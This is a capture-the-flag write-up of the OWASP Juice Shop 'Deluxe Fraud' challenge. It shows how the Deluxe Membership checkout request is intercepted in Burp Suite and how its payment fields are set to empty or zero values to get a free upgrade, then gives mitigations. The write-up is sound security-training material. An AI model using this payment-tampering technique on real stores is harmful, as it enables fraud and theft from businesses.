# Deluxe Fraud Challenge

| Item | Detail |
|---|---|
| Category | Improper Input Validation |
| Difficulty | Hard (3-Star) |
| Juice Shop Flag | `score-board#Deluxe Fraud` |
| Tools Used | Burp Suite (Proxy / Repeater) |
| Status | Solved |

---

## 1. Vulnerability Explanation

The Deluxe Membership upgrade process allows users to pay through different methods such as card or wallet.

The backend does not properly validate payment information before granting membership access.

By intercepting the checkout request, an attacker can manipulate fields such as:

```text
paymentMode
paymentId
```

Using empty or zero values may cause the server to activate Deluxe Membership without successful payment.

This challenge is rated **3 stars** because:

- It requires request interception and modification  
- The flaw is not visible in the normal UI  
- Understanding of payment flow logic is needed  

---

## 2. Security Impact

- Free upgrade to premium features without payment  
- Direct revenue loss for the business  
- Bypass of payment validation controls  
- Demonstrates insecure handling of financial transactions  

---

## 3. Step-by-Step Exploitation

### Step 1: Navigate to Deluxe Membership

- Log in to Juice Shop  
- Open:

```text
/#/deluxe-membership
```

### Step 2: Configure Burp Suite

- Configure browser to use Burp Suite proxy (`127.0.0.1:8080`)  
- Turn **Intercept ON** in Burp Proxy tab  

### Step 3: Initiate the upgrade

- Click the upgrade button  
- Choose any payment method (for example card)  
- Continue until submission  

### Step 4: Intercept the checkout request

Burp captures:

```http
POST /rest/deluxe-membership HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"paymentMode":"card","paymentId":7}
```

### Step 5: Modify the request in Repeater

Send the request to **Repeater** (`Ctrl + R`) and replace the values:

```json
{"paymentMode":"","paymentId":0}
```

Alternative payload used in some versions:

```json
{"paymentMode":"wallet","payUsingWallet":false}
```

### Step 6: Send the request

- Click **Send**

Successful response:

```json
{"status":"success","message":"Deluxe membership activated"}
```

### Step 7: Refresh your session

- Log out of Juice Shop  
- Log back in using the same account  

Your JWT/session token may now contain Deluxe Membership privileges.

### Step 8: Verify

- Check the **Score Board**  
- Challenge is marked as **Solved**

---

## 4. Why This Works

The payment validation logic does not correctly verify that a real payment occurred.

When the server receives values such as:

```text
paymentMode = ""
paymentId = 0
```

it incorrectly interprets the request as acceptable instead of rejecting it.

### Vulnerable flow

```text
Client sends payment request
Server checks request format only
No real payment confirmation occurs
Membership is activated
```

This is a classic business logic flaw combined with poor input validation.

---

## 5. Mitigation

- Validate payment confirmations directly with the payment processor  
- Never trust client-supplied payment status or IDs  
- Reject empty, null, or zero-value payment parameters  
- Use server-side transaction verification before granting benefits  

---

## 6. Key Takeaways

- Always inspect premium upgrade API requests  
- Empty strings and zero values are common bypass tests  
- Financial actions must be validated server-side  
- UI payment success does not equal backend payment success  
